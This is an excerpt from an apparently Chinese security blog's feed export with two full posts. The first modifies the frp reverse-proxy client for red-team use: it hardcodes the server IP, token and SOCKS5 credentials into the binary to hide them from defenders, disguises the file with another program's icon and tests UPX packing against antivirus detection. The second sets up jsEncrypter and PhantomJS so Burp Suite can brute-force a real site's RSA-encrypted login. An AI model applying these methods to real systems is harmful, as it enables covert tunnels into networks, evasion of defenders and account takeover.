class="hljs-keyword">fi</span><br><br>frp_version=`./bin/frps --version`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;build version: <span class="hljs-variable">$frp_version</span>&quot;</span><br><br>make -f ./Makefile.cross-compiles<br><br><span class="hljs-built_in">rm</span> -rf ./release/packages<br><span class="hljs-built_in">mkdir</span> -p ./release/packages<br><br>os_all=<span class="hljs-string">&#x27;linux windows darwin&#x27;</span><br>arch_all=<span class="hljs-string">&#x27;386 amd64&#x27;</span><br><br><span class="hljs-built_in">cd</span> ./release<br><br><span class="hljs-keyword">for</span> os <span class="hljs-keyword">in</span> <span class="hljs-variable">$os_all</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">arch</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$arch_all</span>; <span class="hljs-keyword">do</span><br>        frp_dir_name=<span class="hljs-string">&quot;frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span><br>        frp_path=<span class="hljs-string">&quot;./packages/frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;x<span class="hljs-variable">$&#123;os&#125;</span>&quot;</span> = x<span class="hljs-string">&quot;windows&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$&#123;frp_path&#125;</span><br>            <span class="hljs-built_in">mv</span> ./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe <span class="hljs-variable">$&#123;frp_path&#125;</span>/frpc.exe<br>            <span class="hljs-built_in">mv</span> ./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe <span class="hljs-variable">$&#123;frp_path&#125;</span>/frps.exe<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$&#123;frp_path&#125;</span><br>            <span class="hljs-built_in">mv</span> ./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span> <span class="hljs-variable">$&#123;frp_path&#125;</span>/frpc<br>            <span class="hljs-built_in">mv</span> ./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span> <span class="hljs-variable">$&#123;frp_path&#125;</span>/frps<br>        <span class="hljs-keyword">fi</span>  <br>        <span class="hljs-built_in">cp</span> ../LICENSE <span class="hljs-variable">$&#123;frp_path&#125;</span><br>        <span class="hljs-built_in">cp</span> -rf ../conf/* <span class="hljs-variable">$&#123;frp_path&#125;</span><br><br>        <span class="hljs-comment"># packages</span><br>        <span class="hljs-built_in">cd</span> ./packages<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;x<span class="hljs-variable">$&#123;os&#125;</span>&quot;</span> = x<span class="hljs-string">&quot;windows&quot;</span> ]; <span class="hljs-keyword">then</span><br>            zip -rq <span class="hljs-variable">$&#123;frp_dir_name&#125;</span>.zip <span class="hljs-variable">$&#123;frp_dir_name&#125;</span><br>        <span class="hljs-keyword">else</span><br>            tar -zcf <span class="hljs-variable">$&#123;frp_dir_name&#125;</span>.tar.gz <span class="hljs-variable">$&#123;frp_dir_name&#125;</span><br>        <span class="hljs-keyword">fi</span>  <br>        <span class="hljs-built_in">cd</span> ..<br>        <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;frp_path&#125;</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cd</span> -<br><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkC9A.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh ./package.sh<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkP1I.png" alt=""></p><h3 id="后续1-把配置写入源码食用方式">后续1:把配置写入源码食用方式</h3><p>通常情况frp的运行程序要跟连接配置文件 <code>frpc/s.ini</code>一起传到目标机上运行。在某些情况下，如HVV时，可能会被其他师傅直接反日。 为了防止或者减少被直接&quot;反打&quot;，把配置写死在代码中可以在一定程度上避免泄露配置信息。</p><p>frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.176.128<br>server_port = 6666<br>token = U2VjZGUwIA0K<br>tls_enable = <span class="hljs-literal">true</span><br>[http_proxy]<br><span class="hljs-built_in">type</span> = tcp<br>remote_port = 23333<br>plugin = socks5<br>plugin_user = Secde0<br>plugin_passwd = Swcde0!<br>use_encryption = <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>要修改这几个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">cmd/frpc/sub/root.go<br>cmd/frpc/sub/status.go<br>cmd/frpc/sub/reload.go<br><br></code></pre></td></tr></table></figure><h4 id="改root-go">改<code>root.go</code></h4><p>在var()中新建个变量保存配置内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">fileContent = <span class="hljs-string">`</span><br><span class="hljs-string">[common]</span><br><span class="hljs-string">server_addr = 192.168.176.128</span><br><span class="hljs-string">server_port = 6666</span><br><span class="hljs-string">token = U2VjZGUwIA0K</span><br><span class="hljs-string">tls_enable = true</span><br><span class="hljs-string">[http_proxy]</span><br><span class="hljs-string">type = tcp</span><br><span class="hljs-string">remote_port = 23333</span><br><span class="hljs-string">plugin = socks5</span><br><span class="hljs-string">plugin_user = Secde0</span><br><span class="hljs-string">plugin_passwd = Swcde0!</span><br><span class="hljs-string">use_encryption = true</span><br><span class="hljs-string">`</span><br></code></pre></td></tr></table></figure><h4 id="改status-go">改<code>status.go</code></h4><p>注释 41-45行，把 <code>fileContent</code>赋值给<code>iniContent</code> ，注意要转为<code>byte</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> statusCmd = &amp;cobra.Command&#123;<br>Use:   <span class="hljs-string">&quot;status&quot;</span>,<br>Short: <span class="hljs-string">&quot;Overview of all proxies status&quot;</span>,<br>RunE: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cmd *cobra.Command, args []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">//iniContent, err := config.GetRenderedConfFromFile(cfgFile)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//fmt.Println(err)</span><br><span class="hljs-comment">//os.Exit(1)</span><br><span class="hljs-comment">//&#125;</span><br>iniContent := fileContent<br><br>clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []<span class="hljs-type">byte</span>(iniContent))<br>.......<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkEB8.png" alt=""></p><h4 id="改reload-go">改<code>reload.go</code></h4><p>注释 37-41行，把 <code>fileContent</code>赋值给<code>iniContent</code> ，注意要转为<code>byte</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> reloadCmd = &amp;cobra.Command&#123;<br>Use:   <span class="hljs-string">&quot;reload&quot;</span>,<br>Short: <span class="hljs-string">&quot;Hot-Reload frpc configuration&quot;</span>,<br>RunE: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cmd *cobra.Command, args []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">//iniContent, err := config.GetRenderedConfFromFile(cfgFile)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//fmt.Println(err)</span><br><span class="hljs-comment">//os.Exit(1)</span><br><span class="hljs-comment">//&#125;</span><br>iniContent := fileContent<br><br>clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []<span class="hljs-type">byte</span>(iniContent))<br>........<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkAnf.png" alt=""></p><p>再回到<code>root.go</code> 文件<code>runClient</code>方法，注释198行（未改动时应该在184行），然后新增一行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">content, err = []<span class="hljs-type">byte</span>(fileContent), <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkFjP.png" alt=""></p><p>重新编译，运行：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkeAg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/14/grkVHS.png" alt=""></p><h3 id="后续2-通过参数传入食用方法">后续2:通过参数传入食用方法</h3><p>参照 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a>  【frpc.ini的ip通过参数传入】中的步骤进行修改。</p><p><strong>注</strong>：需要使用<code>Jack-Kingdom</code>提供源码进行修改，不能使用官方的，否则无法编译？</p><p>Changfrp：<code>https://github.com/Jack-Kingdom/frp/tree/4a5c9a8796701472037c979b467c6a9ea449fd62</code></p><h4 id="定义传参">定义传参</h4><p>编辑<code>cmd/frpc/root.go</code></p><p>在 <code>var()</code>中创建4个变量，然后修改 <code>init() </code> 方法，传参：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="hljs-string">&quot;server_addr&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;server_addr&quot;</span>)<br>rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="hljs-string">&quot;server_port&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;server_port&quot;</span>)<br>rootCmd.PersistentFlags().StringVarP(&amp;fport, <span class="hljs-string">&quot;remote_port&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;remote_port&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkK9s.png" alt=""></p><h4 id="创建存放配置信息的方法">创建存放配置信息的方法</h4><p>编辑：<code>cmd/frpc/sub/root.go</code>  ，新增 <code>getFileContent</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getFileContent</span><span class="hljs-params">(ip <span class="hljs-type">string</span>, port <span class="hljs-type">string</span>, fport <span class="hljs-type">string</span>)</span></span> &#123;<br><span class="hljs-keyword">var</span> content <span class="hljs-type">string</span> = <span class="hljs-string">`</span><br><span class="hljs-string">[common]</span><br><span class="hljs-string">server_addr = `</span> + ip + <span class="hljs-string">`</span><br><span class="hljs-string">server_port = `</span> + port + <span class="hljs-string">`</span><br><span class="hljs-string">tls_enable = true</span><br><span class="hljs-string">token = Secde0666</span><br><span class="hljs-string">[http_proxy]</span><br><span class="hljs-string">type = tcp</span><br><span class="hljs-string">remote_port = `</span> + fport + <span class="hljs-string">`</span><br><span class="hljs-string">plugin = socks5</span><br><span class="hljs-string">`</span><br>fileContent = content<br>&#125;<br></code></pre></td></tr></table></figure><p>修改<code>runClient</code>函数，传入参数:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runClient</span><span class="hljs-params">(cfgFilePath <span class="hljs-type">string</span>, ip <span class="hljs-type">string</span>, port <span class="hljs-type">string</span>, fport <span class="hljs-type">string</span>)</span></span> (err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> content <span class="hljs-type">string</span><br>getFileContent(ip, port, fport)<br><span class="hljs-comment">//content, err = config.GetRenderedConfFromFile(cfgFilePath)</span><br>content, err = fileContent, <span class="hljs-literal">nil</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grknhj.png" alt=""></p><p>同一文件，100行附近 <code>var rootCmd = &amp;cobra.Command</code> 中调用了<code>runClient()</code>，需要修改传入参数：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkmNQ.png" alt=""></p><h4 id="编译打包-2">编译打包</h4><p><code>package.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># compile for version</span><br>make<br><span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;make error&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>frp_version=`./bin/frps --version`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;build version: <span class="hljs-variable">$frp_version</span>&quot;</span><br><br><span class="hljs-comment"># cross_compiles</span><br>make -f ./Makefile.cross-compiles<br><br><span class="hljs-built_in">rm</span> -rf ./release/packages<br><span class="hljs-built_in">mkdir</span> -p ./release/packages<br><br>os_all=<span class="hljs-string">&#x27;linux windows darwin freebsd&#x27;</span><br>arch_all=<span class="hljs-string">&#x27;386 amd64 arm arm64 mips64 mips64le mips mipsle&#x27;</span><br><br><span class="hljs-built_in">cd</span> ./release<br><br><span class="hljs-keyword">for</span> os <span class="hljs-keyword">in</span> <span class="hljs-variable">$os_all</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">arch</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$arch_all</span>; <span class="hljs-keyword">do</span><br>        frp_dir_name=<span class="hljs-string">&quot;frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span><br>        frp_path=<span class="hljs-string">&quot;./packages/frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>&quot;</span><br>        <span class="hljs-built_in">cd</span> ..<br>        <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;frp_path&#125;</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><p>使用：<code>frpc -t 服务端IP -p 通讯端口 -f 代理使用端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -t 192.168.176.128 -p 7777 -f 9999<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grklj0.png" alt=""></p><h3 id="后续3-加资源-图标混淆？">后续3:加资源/图标混淆？</h3><p>用 <code>Restorator</code> 加个图标，图标可以用 <code>BeCyIconGrabber</code> 从其他软件提取出来。</p><p>提取图标：</p><p><img src="https://z3.ax1x.com/2021/05/14/grk3uV.png" alt=""></p><p>打开<code>Restorator</code> ，拖入frp到资源树栏，添加资源，类型选图标，名称任意，拖入图标文件到下图【wps】中。</p><p><img src="https://z3.ax1x.com/2021/05/14/grk8BT.png" alt=""></p><p>然后右键软件另存即可。</p><p><img src="https://z3.ax1x.com/2021/05/14/grkGHU.png" alt=""></p><h3 id="后续4-UPX压缩减小体积？">后续4:UPX压缩减小体积？</h3><p>@Secde0大佬说：<code>别压缩了，有些文件超过10m反而直接放行了，小的被拦截概率大</code>。我不信，上upx压缩后，用010Editor，删除一下头部标识：upx全部填充为0：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkYEF.png" alt=""></p><p>eemm，压缩后确实加大查杀率了…</p><p>1为不压缩、5为upx压缩、4为压缩+改标识</p><p><img src="https://z3.ax1x.com/2021/05/14/grktN4.png" alt=""></p><h3 id="试验">试验</h3><p>就不捉流量看指纹了，直接测试修改后是否正常可用。</p><p>linu to Linux</p><p><img src="https://z3.ax1x.com/2021/05/14/grkaC9.png" alt=""></p><p>Windows to Linux</p><p><img src="https://z3.ax1x.com/2021/05/14/grkN4J.png" alt=""></p><p>Reference</p><p><a href="https://www.anquanke.com/post/id/231685">https://www.anquanke.com/post/id/231685</a></p><p><a href="https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2">https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2</a></p><p><a href="https://www.cnblogs.com/cwkiller/p/14108589.html">https://www.cnblogs.com/cwkiller/p/14108589.html</a></p><p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a></p><p><a href="https://github.com/fatedier/frp/pull/1919/files">https://github.com/fatedier/frp/pull/1919/files</a></p><p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%E7%BB%AD.html">https://uknowsec.cn/posts/notes/FRP改造计划续.html</a></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某云课堂RSA加密登陆爆破小记</title>
    <link href="/posts/c8e756ab.html"/>
    <url>/posts/c8e756ab.html</url>
    
    <content type="html"><![CDATA[<p>某天，Leader随手甩了个目标，要对某课堂做测试。我xxx****，又是个开头登录页面的“破站”。</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNR4x.png" alt=""></p><p>没有验证码，祭出Burp Suite爆之！</p><p>然而，然而，password字段居然是加密的，现在开发的安全意识都这么“高”了吗？</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN4gO.png" alt=""></p><p>不想测这破站，只想摸鱼领个底薪，不测了，破站扔一边去…</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNh8K.png" alt=""></p><p>几天后…</p><blockquote><p>Leader：站点测试怎么样了，报告发一下</p><p>Me：额，快好了，正在整理报告了，稍后发。</p></blockquote><p><img src="https://z3.ax1x.com/2021/07/11/WCNoKe.png" alt=""></p><p>再度打开burpsuite重新看看那破站了，唉…</p><hr /><p>​粗略的瞄了瞄，登录功能上没有验证码，且无错误次数等限制，只是通过 jsRSA 加密算法把 password 字段加密，而且公钥存在于 HTML 代码中，那么可以本地调用其加密函数把 payloads加密后再发送，从而暴力猜解用户账号密码。</p><p>加密函数：</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN2U1.png" alt=""></p><h4 id="下载-实现加密的js脚本到本地">下载 实现加密的js脚本到本地</h4><p><a href="http://xxxxx.com/javascripts/jsrsasign-latest-all-min.js">http://xxxxx.com/javascripts/jsrsasign-latest-all-min.js</a></p><h4 id="下载加密脚本-BurpSuite扩展以及Apache-Maven">下载加密脚本/BurpSuite扩展以及Apache Maven</h4><p><a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p><p><a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><h4 id="编译插件jsEncrypter">编译插件jsEncrypter</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/11/WCNgER.png" alt=""></p><p>编译完后加载到Burp Suite中。</p><h4 id="编写phantomJS运行脚本">编写phantomJS运行脚本</h4><p>使用 <code>test/TestScript/RSA/jsEncrypter_rsa.js</code> 模板。将实现加密算法的js文件引入模板脚本，在模板脚本的 <code>js_encrypt</code> 函数体中完成对加密函数的调用。</p><p><code>jsEncrypter_rsa.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">...............<br><br><span class="hljs-comment">// load js file</span><br><span class="hljs-keyword">var</span> wasSuccessful = phantom.<span class="hljs-title function_">injectJs</span>(<span class="hljs-string">&#x27;jsrsasign-latest-all-min.js&#x27;</span>);<br><br><span class="hljs-comment">//Processing function</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">js_encrypt</span>(<span class="hljs-params">payload</span>)&#123;<br><span class="hljs-keyword">var</span> newpayload;<br><span class="hljs-comment">/**Write the code that calls the encryption function to encrypt here***/</span><br><span class="hljs-keyword">var</span> prefix = <span class="hljs-string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span>;<br><span class="hljs-keyword">var</span> suffix = <span class="hljs-string">&quot;\n-----END PUBLIC KEY-----&quot;</span>;<br><span class="hljs-keyword">var</span> key = <span class="hljs-string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOIykY8AmZkoDPDL9zfgV48FKY1RcqWYj4YE/zzvNXDl8e7hnkNRNRHk3InE95ehk340iOumV+RJ9KdihoWKHqnSPH2wTxDdI2WFuI1FOfndL67fJliEHx9z6A7bfFUZZq9xuzoA/zPCZbLsfWfa2mbi96Qc1lI73kCa8sLmDwwIDAQAB&quot;</span>;<br><span class="hljs-keyword">var</span> publicKey = prefix + key + suffix;<br><span class="hljs-keyword">var</span> pub = <span class="hljs-variable constant_">KEYUTIL</span>.<span class="hljs-title function_">getKey</span>(publicKey);<br><br><span class="hljs-comment">// encrypt.setPublicKey(key);</span><br>newpayload = <span class="hljs-variable constant_">KJUR</span>.<span class="hljs-property">crypto</span>.<span class="hljs-property">Cipher</span>.<span class="hljs-title function_">encrypt</span>(payload, pub);<br><span class="hljs-comment">/**********************************************************/</span><br><span class="hljs-keyword">return</span> newpayload;<br>&#125;<br>..............<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/11/WCN5vD.png" alt=""></p><h4 id="下载phantomJS并运行脚本">下载phantomJS并运行脚本</h4><p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">phantomJS.exe jsEncrypter_rsa.js<br></code></pre></td></tr></table></figure><h4 id="拦截登录包暴力破解">拦截登录包暴力破解</h4><p>删除 Cookie 字段，关联扩展jsEncrypter：</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN6b9.png" alt=""></p><p>整理报告，交差~ 又可以愉快的学(摸)习(鱼)了。</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNTDH.png" alt=""></p><p>以上纯属虚构，如有雷同，实属巧合。</p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>S2-001复现</title>
    <link href="/posts/41ac148a.html"/>
    <url>/posts/41ac148a.html</url>
    
